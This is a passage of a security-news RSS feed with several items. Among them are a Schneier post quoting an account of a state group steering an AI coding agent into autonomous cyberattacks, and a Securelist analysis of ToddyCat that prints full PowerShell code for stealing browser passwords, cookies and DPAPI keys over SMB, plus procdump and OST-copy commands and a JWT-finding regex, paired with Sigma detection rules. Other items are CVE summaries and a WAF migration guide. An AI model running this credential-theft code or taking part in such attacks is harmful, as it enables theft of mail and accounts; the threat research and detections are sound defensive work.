      It was translated with technical assistance and editorially reviewed before publication.]]></content:encoded></item><item><title>Attleboro investigating ‘cybersecurity incident’ impacting city’s IT systems</title><link>https://databreaches.net/2025/11/21/attleboro-investigating-cybersecurity-incident-impacting-citys-it-systems/?pk_campaign=feed&amp;pk_kwd=attleboro-investigating-cybersecurity-incident-impacting-citys-it-systems</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 21 Nov 2025 12:08:35 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>AI as Cyberattacker</title><link>https://www.schneier.com/blog/archives/2025/11/ai-as-cyberattacker.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 21 Nov 2025 12:01:36 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[In mid-September 2025, we detected suspicious activity that later investigation determined to be a highly sophisticated espionage campaign. The attackers used AI’s “agentic” capabilities to an unprecedented degree­—using AI not just as an advisor, but to execute the cyberattacks themselves.The threat actor—­whom we assess with high confidence was a Chinese state-sponsored group—­manipulated our Claude Code tool into attempting infiltration into roughly thirty global targets and succeeded in a small number of cases. The operation targeted large tech companies, financial institutions, chemical manufacturing companies, and government agencies. We believe this is the first documented case of a large-scale cyberattack executed without substantial human intervention.The attack relied on several features of AI models that did not exist, or were in much more nascent form, just a year ago:. Models’ general levels of capability have increased to the point that they can follow complex instructions and understand context in ways that make very sophisticated tasks possible. Not only that, but several of their well-developed specific skills—in particular, software coding­—lend themselves to being used in cyberattacks.
. Models can act as agents—­that is, they can run in loops where they take autonomous actions, chain together tasks, and make decisions with only minimal, occasional human input.
. Models have access to a wide array of software tools (often via the open standard Model Context Protocol). They can now search the web, retrieve data, and perform many other actions that were previously the sole domain of human operators. In the case of cyberattacks, the tools might include password crackers, network scanners, and other security-related software.]]></content:encoded></item><item><title>Fired techie admits sabotaging ex-employer, causing $862K in damage</title><link>https://databreaches.net/2025/11/21/fired-techie-admits-sabotaging-ex-employer-causing-862k-in-damage/?pk_campaign=feed&amp;pk_kwd=fired-techie-admits-sabotaging-ex-employer-causing-862k-in-damage</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 21 Nov 2025 11:49:46 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Broadcom Allegedly Breached by Clop Ransomware via E-Business Suite 0-Day Hack</title><link>https://cybersecuritynews.com/broadcom-allegedly-breached-by-clop-ransomware/</link><author></author><category>security</category><pubDate>Fri, 21 Nov 2025 11:05:20 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            The Cl0p ransomware group has claimed responsibility for infiltrating Broadcom’s internal systems as part of an ongoing exploitation campaign targeting Oracle E-Business Suite vulnerabilities.
The hac ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Critical Grafana Vulnerability Let Attackers Escalate Privilege</title><link>https://cybersecuritynews.com/critical-grafana-vulnerability/</link><author></author><category>security</category><pubDate>Fri, 21 Nov 2025 11:01:20 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Grafana Labs has disclosed a critical security vulnerability affecting Grafana Enterprise that could allow attackers to escalate privileges and impersonate users.
The flaw, tracked as CVE-2025-41115,  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Why IT Admins Choose Samsung for Mobile Security</title><link>https://thehackernews.com/2025/11/why-it-admins-choose-samsung-for-mobile.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilI5_YDygribQzJZg5C74qlMvNYPDbhlWqrYmASyrb9-lTORJ7B0Iuw1i_7M80fHWGgB2ph_w0FoEX0ptY4pTxRNr0kB_rGoJqvp3wd3f80Fc3hjkd5W8CbU1NmXQkf8H1vR8aoJsstZdcEFq7_weKbZQqKpVDBTqRjdL9uMv8WTpkifreXt1EJ7RGDqY/s1600/samsung.jpg" length="" type=""/><pubDate>Fri, 21 Nov 2025 11:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Ever wonder how some IT teams keep corporate data safe without slowing down employees? Of course you have.
Mobile devices are essential for modern work—but with mobility comes risk. IT admins, like you, juggle protecting sensitive data while keeping teams productive. That’s why more enterprises are turning to Samsung for mobile security.
Hey—you're busy, so here's a quick-read article on what]]></content:encoded></item><item><title>APT24 Deploys BADAUDIO in Years-Long Espionage Hitting Taiwan and 1,000+ Domains</title><link>https://thehackernews.com/2025/11/apt24-deploys-badaudio-in-years-long.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5fGdXpR7pCeJpEqPu004ib52NeUwcRAWg8rpaNjFnvLAKcXXAJlHX1A4sgAfLJGc08sUQdEJnmnmtTClxO75Mp2evzyrbHLmQdTx0O3UdCbzZdTJAY71PpCj0gweks8UQDik_IpkCA5Pzxe9p8YA7u2ct5k67kFvIqHs18JF6YHSmZTuYsVbZatTsUKZV/s1600/cyberattack.jpg" length="" type=""/><pubDate>Fri, 21 Nov 2025 10:42:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A China-nexus threat actor known as APT24 has been observed using a previously undocumented malware dubbed BADAUDIO to establish persistent remote access to compromised networks as part of a nearly three-year campaign.
"While earlier operations relied on broad strategic web compromises to compromise legitimate websites, APT24 has recently pivoted to using more sophisticated vectors targeting]]></content:encoded></item><item><title>Critical ASUSTOR Vulnerability Let Attackers Execute Malicious Code with Elevated Privileges</title><link>https://cybersecuritynews.com/asustor-vulnerability-attackers-execute-malicious-code/</link><author></author><category>security</category><pubDate>Fri, 21 Nov 2025 10:04:59 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            A critical security vulnerability has been discovered in ASUSTOR backup and synchronization software, allowing attackers to execute malicious code with elevated system privileges.
The flaw, tracked as ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>ToddyCat: your hidden email assistant. Part 1</title><link>https://securelist.com/toddycat-apt-steals-email-data-from-outlook/118044/</link><author>Andrey Gunkin</author><category>threatintel</category><enclosure url="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/11/21084301/toddycat-outlook-featured-image-150x150.jpg" length="" type=""/><pubDate>Fri, 21 Nov 2025 10:00:33 +0000</pubDate><source url="https://securelist.com/">Securelist</source><content:encoded><![CDATA[Email remains the main means of business correspondence at organizations. It can be set up either using on-premises infrastructure (for example, by deploying Microsoft Exchange Server) or through cloud mail services such as Microsoft 365 or Gmail.At first glance, it might seem that using cloud services offers a higher level of confidentiality for corporate correspondence: mail data remains external, even if the organization’s internal infrastructure is compromised. However, this does not stop highly organized espionage groups like the ToddyCat APT group.This research describes how ToddyCat APT evolved its methods to gain covert access to the business correspondence of employees at target companies. In the first part, we review the incidents that occurred in the second half of 2024 and early 2025. In the second part of the report, we focus in detail on how the attackers implemented a new attack vector as a result of their efforts. This attack enables the adversary to leverage the user’s browser to obtain OAuth 2.0 authorization tokens. These tokens can then be utilized outside the perimeter of the compromised infrastructure to access corporate email.In a previous post on the ToddyCat group, we described the TomBerBil family of tools, which are designed to extract cookies and saved passwords from browsers on user hosts. These tools were written in C# and C++.Yet, analysis of incidents from May to June 2024 revealed a new variant implemented in PowerShell. It retained the core malicious functionality of the previous samples but employed a different implementation approach and incorporated new commands.A key feature of this version is that it was executed on domain controllers on behalf of a privileged user, accessing browser files via shared network resources using the SMB protocol.Besides supporting the Chrome and Edge browsers, the new version also added processing for Firefox browser files.The tool was launched using a scheduled task that executed the following command line:powershell -exec bypass -command "c:\programdata\ip445.ps1"
The script begins by creating a new local directory, which is specified in the  variable. The tool saves all data it collects into this directory.$baseDir = 'c:\programdata\temp\'

try{
	New-Item -ItemType directory -Path $baseDir | Out-Null
}catch{
	
}
The script defines a function named , which accepts the full file path as a parameter. It opens the C:\programdata\uhosts.txt file and reads its content line by line using .NET Framework classes, returning the result as a string array. This is how the script forms an array of host names.function parseFile{
    param(
        [string]$fileName
    )
    
    $fileReader=[System.IO.File]::OpenText($fileName)

    while(($line = $fileReader.ReadLine()) -ne $null){
        try{
            $line.trim()
            }
        catch{
        }
    }
    $fileReader.close()
}
For each host in the array, the script attempts to establish an SMB connection to the shared resource , constructing the path in the  format. If the connection is successful, the tool retrieves a list of user directories present on the remote host. If at least one directory is found, a separate folder is created for that host within the  working directory:foreach($myhost in parseFile('c:\programdata\uhosts.txt')){
    $myhost=$myhost.TrimEnd()
    $open=$false
    
    $cpath = "\\{0}\c$\users\" -f $myhost
    $items = @(get-childitem $cpath -Force -ErrorAction SilentlyContinue)
	
	$lpath = $baseDir + $myhost
	try{
		New-Item -ItemType directory -Path $lpath | Out-Null
	}catch{
		
	}
In the next stage, the script iterates through the user folders discovered on the remote host, skipping any folders specified in the  variable, which is defined upon launching the tool. For the remaining folders, three directories are created in the script’s working folder for collecting data from Google Chrome, Mozilla Firefox, and Microsoft Edge.$filter_users = @('public','all users','default','default user','desktop.ini','.net v4.5','.net v4.5 classic')

foreach($item in $items){
	
	$username = $item.Name
	if($filter_users -contains $username.tolower()){
		continue
	}
	$upath = $lpath + '\' + $username
	
	try{
		New-Item -ItemType directory -Path $upath | Out-Null
		New-Item -ItemType directory -Path ($upath + '\google') | Out-Null
		New-Item -ItemType directory -Path ($upath + '\firefox') | Out-Null
		New-Item -ItemType directory -Path ($upath + '\edge') | Out-Null
	}catch{
		
	}
Next, the tool uses the default account to search for the following Chrome and Edge browser files on the remote host:: a database file that contains the user’s saved logins and passwords for websites in an encrypted format: a JSON file containing the encryption key used to encrypt stored data: a database file that stores HTTP cookies for all websites visited by the user: a database that stores the browser’s historyThese files are copied via SMB to the local folder within the corresponding user and browser folder hierarchy. Below is a code snippet that copies the Login Data file:$googlepath = $upath + '\google\'
$firefoxpath = $upath + '\firefox\'
$edgepath = $upath + '\edge\'
$loginDataPath = $item.FullName + "\AppData\Local\Google\Chrome\User Data\Default\Login Data"
if(test-path -path $loginDataPath){
	$dstFileName = "{0}\{1}" -f $googlepath,'Login Data'
	copy-item -Force -Path $loginDataPath -Destination $dstFileName | Out-Null
}
The same procedure is applied to Firefox files, with the tool additionally traversing through all the user profile folders of the browser. Instead of the files described above for Chrome and Edge, the script searches for files which have names from the  array that contain similar information. The requested files are also copied to the tool’s local folder.$firefox_files = @('key3.db','signons.sqlite','key4.db','logins.json')

$firefoxBase = $item.FullName + '\AppData\Roaming\Mozilla\Firefox\Profiles'
if(test-path -path $firefoxBase){
	$profiles = @(get-childitem $firefoxBase -Force -ErrorAction SilentlyContinue)
	foreach($profile in $profiles){
		if(!(test-path -path ($firefoxpath + '\' + $profile.Name))){
			New-Item -ItemType directory -Path ($firefoxpath + '\' + $profile.Name) | Out-Null
		}
		foreach($firefox_file in $firefox_files){
			$tmpPath = $firefoxBase + '\' + $profile.Name + '\' + $firefox_file
			if(test-path -Path $tmpPath){
				$dstFileName = "{0}\{1}\{2}" -f $firefoxpath,$profile.Name,$firefox_file
				copy-item -Force -Path $tmpPath -Destination $dstFileName | Out-Null
			}
		}
	}
}
The copied files are encrypted using the Data Protection API (DPAPI). The previous version of TomBerBil ran on the host and copied the user’s token. As a result, in the user’s current session DPAPI was used to decrypt the master key, and subsequently, the files. The updated server-side version of TomBerBil copies files containing the user encryption keys that are used by DPAPI. These keys, combined with the user’s SID and password, grant the attackers the ability to decrypt all the copied files locally.if(test-path -path ($item.FullName + '\AppData\Roaming\Microsoft\Protect')){
	copy-item -Recurse -Force -Path ($item.FullName + '\AppData\Roaming\Microsoft\Protect') -Destination ($upath + '\') | Out-Null
}
if(test-path -path ($item.FullName + '\AppData\Local\Microsoft\Credentials')){
	copy-item -Recurse -Force -Path ($item.FullName + '\AppData\Local\Microsoft\Credentials') -Destination ($upath + '\') | Out-Null
}
With TomBerBil, the attackers automatically collected user cookies, browsing history, and saved passwords, while simultaneously copying the encryption keys needed to decrypt the browser files. The connection to the victim’s remote hosts was established via the SMB protocol, which significantly complicated the detection of the tool’s activity.As a rule, such tools are deployed at later stages, after the adversary has established persistence within the organization’s internal infrastructure and obtained privileged access.To detect the implementation of this attack, it’s necessary to set up auditing for access to browser folders and to monitor network protocol connection attempts to those folders.title: Access To Sensitive Browser Files Via Smb
id: 9ac86f68-9c01-4c9d-897a-4709256c4c7b
status: experimental
description: Detects remote access attempts to browser files containing sensitive information
author: Kaspersky
date: 2025-08-11
tags:
    - attack.credential-access
    - attack.t1555.003
logsource:
    product: windows
    service: security
detection:
    event:
        EventID: '5145'
    chromium_files:
        ShareLocalPath|endswith:
            - '\User Data\Default\History'
            - '\User Data\Default\Network\Cookies'
            - '\User Data\Default\Login Data'
            - '\User Data\Local State'
    firefox_path:
        ShareLocalPath|contains: '\AppData\Roaming\Mozilla\Firefox\Profiles'
    firefox_files:
        ShareLocalPath|endswith:
            - 'key3.db'
            - 'signons.sqlite'
            - 'key4.db'
            - 'logins.json'
    condition: event and (chromium_files or firefox_path and firefox_files)
falsepositives: Legitimate activity
level: medium
In addition, auditing for access to the folders storing the DPAPI encryption key files is also required.title: Access To System Master Keys Via Smb
id: ba712364-cb99-4eac-a012-7fc86d040a4a
status: experimental
description: Detects remote access attempts to the Protect file, which stores DPAPI master keys
references:
    - https://www.synacktiv.com/en/publications/windows-secrets-extraction-a-summary
author: Kaspersky
date: 2025-08-11
tags:
    - attack.credential-access
    - attack.t1555
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: '5145'
        ShareLocalPath|contains: 'windows\System32\Microsoft\Protect'
    condition: selection
falsepositives: Legitimate activity
level: mediumStealing emails from OutlookThe modified TomBerBil tool family proved ineffective at evading monitoring tools, compelling the threat actor to seek alternative methods for accessing the organization’s critical data. We discovered an attempt to gain access to corporate correspondence files in the local Outlook storage.The Outlook application stores OST (Offline Storage Table) files for offline use. The names of these files contain the address of the mailbox being cached. Outlook uses OST files to store a local copy of data synchronized with mail servers: Microsoft Exchange, Microsoft 365, or Outlook.com. This capability allows users to work with emails, calendars, contacts, and other data offline, then synchronize changes with the server once the connection is restored.However, access to an OST file is blocked by the application while Outlook is running. To copy the file, the attackers created a specialized tool called TCSectorCopy.This tool is designed for block-by-block copying of files that may be inaccessible by applications or the operating system, such as files that are locked while in use.The tool is a 32-bit PE file written in C++. After launch, it processes parameters passed via the command line: the path to the source file to be copied and the path where the result should be saved. The tool then validates that the source path is not identical to the destination path.Validating the TCSectorCopy command line parametersNext, the tool gathers information about the disk hosting the file to be copied: it determines the cluster size, file system type, and other parameters necessary for low-level reading.Determining the disk’s file system typeTCSectorCopy then opens the disk as a device in read-only mode and sequentially copies the file content block by block, bypassing the standard Windows API. This allows the tool to copy even the files that are locked by the system or other applications.The adversary uploaded this tool to target host and used it to copy user OST files:xCopy.exe  C:\Users\<user>\AppData\Local\Microsoft\Outlook\<email>@<domain>.ost <email>@<domain>.ost2
Having obtained the OST files, the attackers processed them using a separate tool to extract the email correspondence content.XstReader is an open-source C# tool for viewing and exporting the content of Microsoft Outlook OST and PST files. The attackers used XstReader to export the content of the previously copied OST files.XstReader is executed with the  parameter and the path to the copied file. The  parameter specifies the export of all messages and their attachments to the current folder in the HTML, RTF, and TXT formats.XstExport.exe -e <email>@<domain>.ost2
After exporting the data from the OST file, the attackers review the list of obtained files, collect those of interest into an archive, and exfiltrate it.Stealing data with TCSectorCopy and XstReaderTo detect unauthorized access to Outlook OST files, it’s necessary to set up auditing for the %LOCALAPPDATA%\Microsoft\Outlook\ folder and monitor access events for files with the  extension. The Outlook process and other processes legitimately using this file must be excluded from the audit.title: Access To Outlook Ost Files
id: 2e6c1918-08ef-4494-be45-0c7bce755dfc
status: experimental
description: Detects access to the Outlook Offline Storage Table (OST) file
author: Kaspersky
date: 2025-08-11
tags:
    - attack.collection
    - attack.t1114.001
logsource:
    product: windows
    service: security
detection:
    event:
        EventID: 4663
    outlook_path:
        ObjectName|contains: '\AppData\Local\Microsoft\Outlook\'
    ost_file:
        ObjectName|endswith: '.ost'
    condition: event and outlook_path and ost_file
falsepositives: Legitimate activity
level: low
The TCSectorCopy tool accesses the OST file via the disk device, so to detect it, it’s important to monitor events such as Event ID 9 (RawAccessRead) in Sysmon. These events indicate reading directly from the disk, bypassing the file system.As we mentioned earlier, TCSectorCopy receives the path to the OST file via a command line. Consequently, detecting this tool’s malicious activity requires monitoring for a specific OST file naming pattern: the  symbol and the  extension in the file name.Example of detecting TCSectorCopy activity in KATAStealing access tokens from OutlookSince active file collection actions on a host are easily tracked using monitoring systems, the attackers’ next step was gaining access to email outside the hosts where monitoring was being performed. Some target organizations used the Microsoft 365 cloud office suite. The attackers attempted to obtain the access token that resides in the memory of processes utilizing this cloud service.In the OAuth 2.0 protocol, which Microsoft 365 uses for authorization, the access token is used when requesting resources from the server. In Outlook, it is specified in API requests to the cloud service to retrieve emails along with attachments. Its disadvantage is its relatively short lifespan; however, this can be enough to retrieve all emails from a mailbox while bypassing monitoring tools.The access token is stored using the JWT (JSON Web Tokens) standard. The token content is encoded using Base64. JWT headers for Microsoft applications always specify the  parameter with the  value first. This means that the first 18 characters of the encoded token will always be the same.The attackers used SharpTokenFinder to obtain the access token from the user’s Outlook application. This tool is written in C# and designed to search for an access token in processes associated with the Microsoft 365 suite. After launch, the tool searches the system for the following processes:If these processes are found, the tool attempts to open each process’s object using the  function and dump their memory. To do this, the tool imports the MiniDumpWriteDump function from the  file, which writes user mode minidump information to the specified file. The dump files are saved in the  folder, located in the current SharpTokenFinder directory. After creating dump files for the processes, the tool searches for the following string pattern in each of them:"eyJ0eX[a-zA-Z0-9\\._\\-]+"
This template uses the first six symbols of the encoded JWT token, which are always the same. Its structures are separated by dots. This is sufficient to find the necessary string in the process memory dump.In the incident being described, the local security tools (EPP) blocked the attempt to create the  process dump using SharpTokenFinder, so the operator used ProcDump from the Sysinternals suite for this purpose:procdump64.exe -accepteula -ma OUTLOOK.exe
dir c:\windows\temp\OUTLOOK.EXE_<id>.dmp
c:\progra~1\winrar\rar.exe a -k -r -s -m5 -v100M %temp%\dmp.rar c:\windows\temp\OUTLOOK.EXE_<id>.dmp
Here, the operator executed ProcDump with the following parameters: silently accepts the license agreement without displaying the agreement window. indicates that a full process dump should be created. is the name of the process to be dumped.The  command is then executed as a check to confirm that the file was created and is not zero size. Following this validation, the file is added to a  archive using WinRAR. The attackers sent this file to their host via SMB.To detect this technique, it’s necessary to monitor the ProcDump process command line for names belonging to Microsoft 365 application processes.title: Dump Of Office 365 Processes Using Procdump
id: 5ce97d80-c943-4ac7-8caf-92bb99e90e90
status: experimental
description: Detects Office 365 process names in the command line of the procdump tool
author: kaspersky
date: 2025-08-11
tags:
    - attack.lateral-movement
    - attack.defense-evasion
    - attack.t1550.001
logsource:
  category: process_creation
  product: windows
detection:
    selection:
        Product: 'ProcDump'
        CommandLine|contains:
            - 'teams'
            - 'winword'
            - 'onenote'
            - 'powerpnt'
            - 'outlook'
            - 'excel'
            - 'onedrive'
            - 'sharepoint'
    condition: selection
falsepositives: Legitimate activity
level: high
Below is an example of the ProcDump tool from the Sysinternals package used to dump the Outlook process memory, detected by Kaspersky Anti Targeted Attack (KATA).Example of Outlook process dump detection in KATAThe incidents reviewed in this article show that ToddyCat APT is constantly evolving its techniques and seeking new ways to conceal its activity aimed at gaining access to corporate correspondence within compromised infrastructure. Most of the techniques described here can be successfully detected. For timely identification of these techniques, we recommend using both host-based EPP solutions, such as Kaspersky Endpoint Security for Business, and complex threat monitoring systems, such as Kaspersky Anti Targeted Attack. For comprehensive, up-to-date information on threats and corresponding detection rules, we recommend Kaspersky Threat Intelligence.
C:\programdata\ip445.ps1
C:\Windows\Temp\xCopy.exe
C:\Windows\Temp\XstExport.exe
O:\Projects\Penetration\Tools\SectorCopy\Release\SectorCopy.pdb]]></content:encoded></item><item><title>Use of CSS stuffing as an obfuscation technique&amp;#x3f;, (Fri, Nov 21st)</title><link>https://isc.sans.edu/diary/rss/32510</link><author></author><category>threatintel</category><pubDate>Fri, 21 Nov 2025 09:48:20 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[From time to time, it can be instructive to look at generic phishing messages that are delivered to one’s inbox or that are caught by basic spam filters. Although one usually doesn’t find much of interest, sometimes these little excursions into what should be a run-of-the-mill collection of basic, commonly used phishing techniques can lead one to find something new and unusual. This was the case with one of the messages delivered to our handler inbox yesterday…]]></content:encoded></item><item><title>CVE-2025-13156 - Vitepos – Point of Sale (POS) for WooCommerce &lt;= 3.3.0 - Authenticated (Subscriber+) Arbitrary File Upload to Remote Code Execution</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13156</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 09:15:46 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13156
 Nov. 21, 2025, 9:15 a.m. | 2 days, 8 hours ago
The Vitepos – Point of Sale (POS) for WooCommerce plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the insert_media_attachment() function in all versions up to, and including, 3.3.0. This is due to the save_update_category_img() function accepting user-supplied file types without validation when processing category images. This makes it possible for authenticated attackers, with subscriber level access and above, to upload arbitrary files on the affected site's server which makes remote code execution possible.
 8.8 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Smooth upgrading of OWASP CRS3 to CRS4</title><link>https://www.netnea.com/cms/2025/11/20/the-new-netnea-crs-upgrading-plugin-simplifying-the-migration-from-crs-v3-to-v4/</link><author>/u/dune73</author><category>netsec</category><pubDate>Fri, 21 Nov 2025 09:12:01 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Migrating from CRS v3 to CRS v4 can be intimidating. It’s a complicated task that risks to leave you vulnerable during the transition. But with the help of the new netnea-CRS-Upgrading-Plugin you can keep your guards up during the transition.Upgrading the OWASP CRS ruleset from version 3 to version 4 is not as trivial as simply increasing a version number. This is reflected by the fact that, even though CRS v4 was released in February 2024, a large number of CRS v3 installations are still in active use.Between CRS v3 and v4, many rules have changed significantly, partly due to insights gained from our private bug bounty program in 2023. New rules were added and existing rules were tightened or expanded based on real-world vulnerability reports. While this makes CRS v4 the most secure CRS release line we’ve ever released, it also means that upgrading involves more work than simply switching versions. The risk of new false positives (FPs) is high, requiring a careful tuning phase.Tuning a fresh CRS installation typically follows an iterative approach: install CRS with a high threshold -> tune FPs -> lower the threshold -> tune again -> repeat until reaching the desired threshold. However, if you already have a well-tuned CRS v3 deployment running at a low threshold, following this approach would require temporarily increasing the threshold again. You would then install CRS v4 and repeat the iterative tuning process until the threshold can be lowered back. In production, this temporary elevation of the threshold significantly reduces security, which is not acceptable.To address this problem, I developed a CRS plugin that allows you to introduce CRS v4 alongside your production CRS v3 deployment, without raising thresholds and without reducing security during the transition.This blog post is the first in a three-part series. Here I’ll give you a broad overview and in the latter installments, I will then cover the implementation of the plugin and then the practical migration step by step.Prerequisites: Parallel installation of CRS v4 alongside CRS v3The first step is to install CRS v4 in parallel to the existing CRS v3 installation. The simplest approach is to place the CRS v4 folder next to the existing CRS directory. Because both versions contain rules with overlapping IDs, we must renumber the CRS v4 rule IDs from the  range to a different range. I use the  range. This separate rule block also makes log filtering easier. Next, we remove the blocking rules , ,  and  in CRS v4 so that CRS v4 initially runs in log-only mode.The inbound anomaly score variable name changed between v3 and v4:CRS v3: CRS v4: tx.inbound_anomaly_score_pl1This prevents interference between the two versions’ inbound scoring. Unfortunately, the outbound variable name did not change: it remains tx.outbound_anomaly_score_pl1. To avoid score collisions, we must adjust the outbound variable name in CRS v4 to: tx.outbound_anomaly_score_pl1_crs4.Checking the old crs-setup.conf and aligning it with the new oneAfter installing CRS v4, install the new crs-setup.conf. Several important changes were introduced between the v3 and v4 versions that you must address:If you used application-specific exclusions via rule , note that this rule no longer exists in v4. Application-specific exclusions are now handled by CRS plugins. See the official documentation for details: https://coreruleset.org/docs/4-about-plugins/4-1-plugins/. For example, the following CRS v3 rule needs to be migrated or replaced with a plugin configuration:SecAction \
 "id:900130,\
  phase:1,\
  nolog,\
  pass,\
  t:none,\
  setvar:tx.crs_exclusions_cpanel=1,\
  setvar:tx.crs_exclusions_drupal=1,\
  setvar:tx.crs_exclusions_dokuwiki=1,\
  setvar:tx.crs_exclusions_nextcloud=1,\
  setvar:tx.crs_exclusions_wordpress=1,\
  setvar:tx.crs_exclusions_xenforo=1"
If you used rule , be aware that the format for allowed charset values has changed. In CRS v3 you might have used:tx.allowed_request_content_type_charset=utf-8|iso-8859-1|iso-8859In CRS v4, the values must be prefixed with a leading bar:tx.allowed_request_content_type_charset=|utf-8| |iso-8859-1| ....Step 1: Install the netnea-crs-upgrading-plugin: CRS v4 in log-only modeOnce CRS v4 is installed and the configuration is aligned, you can install the netnea-crs-upgrading-plugin. Installation follows the standard plugin process.By default, the plugin operates in parallel mode. In this mode, CRS v4 runs first in log-only mode, and then CRS v3 runs in full blocking mode. During this phase, the majority of tuning can be performed safely. Your logs will contain alerts produced by the new CRS v4 ruleset, giving you the chance to identify and eliminate false positives without affecting production traffic.This parallel operation is also a rare opportunity to reevaluate your existing exclusions. If your v3 installation contains overly broad or outdated exclusions, parallel mode lets you observe real traffic again and verify whether narrower or updated exclusions would work better.This is also the stage where you must decide whether to migrate existing v3 tunings into the v4 configuration or start fresh. Sometime so much effort has been put into the tuning of rules, it makes sense to review the existing exclusions and transform them to rule exclusions for CRS v4. However, this inevitably carries legacy complexity into your new environment.Starting from zero is the cleanest option and if you choose that route, our tool C-Rex Arms can help you generate proper rule exclusions.C-Rex is a suite of tools provided by netnea. C-Rex supports the handling as well as the identification of false positives (in large amounts of traffic). Aimed at enterprise setups, it reduces the time needed for log analysis and it allows developers to handle the WAFs themselves. More about C-Rex: https://c-rex.netnea.com.Step 2: CRS v4 begins blockingAfter running CRS v4 in log-only mode long enough to feel confident, you can begin enabling blocking selectively. This brings us to step 2.Step 2a: Path-based rolloutThe recommended approach is a path-based rollout. Some parts of your application may already be well-tuned and fully compatible with CRS v4, while others may require more tuning or are considered legacy and not worth adjusting.You can configure specific paths or endpoints to use CRS v4 in blocking mode, while the rest continue to be protected by CRS v3. This allows a controlled, low-risk transition.During this phase, you can gradually expand the set of paths handled by CRS v4. Over time, more and more paths will be migrated to CRS v4, increasing the portion of production traffic that is processed by the new ruleset.For the remaining, unassigned paths, the plugin provides a sampling mode. Here you can specify the percentage of requests that should pass through CRS v4, while the remaining requests continue to be evaluated by CRS v3. This mechanism offers a smooth, controlled way to expose real production traffic to CRS v4 without immediately committing the entire application to the new ruleset. By starting with a low sampling percentage, you can observe the behavior of CRS v4 under realistic load while keeping the risk low.As confidence increases and false positives become less frequent, you can gradually raise the sampling percentage in small increments. This step-by-step approach ensures that any unexpected issues remain contained. Eventually, once you reach 100% sampling, all traffic is handled by CRS v4 in blocking mode, and CRS v3 no longer processes them. This marks the final phase before completely removing CRS v3 from the environment.End of the upgrading processThe upgrade is complete once all paths have been migrated to CRS v4 or once sampling reaches 100%. At this point CRS v3 with its exclusion rules can be removed entirely.You may then:renumber the CRS v4 rule IDs and exclusion rules from  back to the standard  range,and revert the temporary variable name tx.outbound_anomaly_score_pl1_crs4 to its original form.This blog post is part of a three-part series. In the next post, I’ll cover the technical implementation details of the netnea-crs-upgrading-plugin.]]></content:encoded></item><item><title>CVE-2025-13322 - WP AUDIO GALLERY &lt;= 2.0 - Authenticated (Subscriber+) Arbitrary File Deletion via &apos;audio_upload&apos; Parameter</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13322</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 08:15:55 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13322
 Nov. 21, 2025, 8:15 a.m. | 2 days, 9 hours ago
The WP AUDIO GALLERY plugin for WordPress is vulnerable to arbitrary file deletion due to insufficient file path validation in all versions up to, and including, 2.0. This is due to the `wpag_uploadaudio_callback()` AJAX handler not properly validating user-supplied file paths in the `audio_upload` parameter before passing them to `unlink()`. This makes it possible for authenticated attackers, with subscriber-level access and above, to delete arbitrary files on the server, which can easily lead to remote code execution when critical files like wp-config.php are deleted.
 8.1 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-11985 - Realty Portal &lt;= 0.4.1 - Missing Authorization to Authenticated (Subscriber+) Arbitrary Options Update</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11985</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 08:15:52 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11985
 Nov. 21, 2025, 8:15 a.m. | 2 days, 9 hours ago
The Realty Portal plugin for WordPress is vulnerable to unauthorized modification of data that can lead to privilege escalation due to a missing capability check on the 'rp_save_property_settings' function in versions 0.1 to 0.4.1. This makes it possible for authenticated attackers, with Subscriber-level access and above, to update arbitrary options on the WordPress site. This can be leveraged to update the default role for registration to administrator and enable user registration for attackers to gain administrative user access to a vulnerable site.
 8.8 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
